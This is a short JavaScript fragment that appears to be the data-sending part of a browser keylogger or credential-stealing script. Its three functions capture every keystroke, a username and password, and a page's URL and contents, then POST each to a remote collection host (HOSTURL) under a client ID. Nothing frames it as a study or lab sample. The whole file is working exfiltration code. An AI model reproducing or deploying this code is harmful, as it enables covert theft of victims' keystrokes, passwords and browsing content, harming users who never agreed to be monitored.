function logKey(event){
    keys = keys + event.key;
	let data = {
		"client_id": CLIENT_ID,
		"key": encodeURIComponent(keys)
	}

    fetch(HOSTURL + "/data/keys", {
        body: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json"
        },
        method: "POST"
    })
}

function sendCreds(login, password){
	let data = {
		"client_id": CLIENT_ID,
		"username": encodeURIComponent(login),
		"password": encodeURIComponent(password)
	}

	fetch(HOSTURL + "/data/login", {
        body: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json"
        },
        method: "POST"
    })
}

function sendContent(url, content){
	let data = {
		"client_id": CLIENT_ID,
		"location": encodeURIComponent(url),
		"content": encodeURIComponent(content)
	}

	fetch(HOSTURL + "/data/content", {
        body: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json"
        },
        method: "POST"
    })
}